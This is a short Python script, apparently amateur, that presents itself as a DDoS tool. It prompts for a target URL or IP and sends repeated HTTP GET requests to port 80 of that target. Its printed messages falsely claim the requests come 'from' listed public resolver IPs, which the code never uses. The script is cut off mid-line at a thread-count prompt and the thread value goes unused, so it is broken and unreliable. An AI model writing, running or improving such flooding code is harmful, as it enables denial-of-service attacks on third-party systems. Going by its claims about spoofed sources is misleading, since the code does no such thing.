import socket

# Set your own IP addresses here (separated by commas)
ip_addresses = ['8.8.4.4', '1.1.1.1']

def ddos(target_ip):
    try:
        for ip in ip_addresses:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_ip, 80))
            sock.send('GET / HTTP/1.0\r\nHost: example.com\r\n\r\n'.encode())
            print(f"Sent request from {ip} to {target_ip}")
    except Exception as e:
        print(e)

if __name__ == "__main__":
    target = input("Enter the URL or IP address of the target: ")
    threads = int(input("Enter number_"))